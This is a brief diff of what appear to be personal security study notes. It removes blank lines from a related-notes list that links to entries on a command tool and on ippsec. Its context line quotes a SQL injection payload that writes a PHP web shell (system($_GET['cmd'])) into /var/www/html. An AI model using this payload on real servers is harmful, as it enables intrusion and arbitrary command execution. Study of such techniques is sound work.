@@ -9,9 +9,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 # Related
 
 - [20221007200304](/zet/20221007200304/README.md) how to use zc cmd
-
 - [20221006214348](/zet/20221006214348/README.md) ippsec
-
 
 Tags:
 
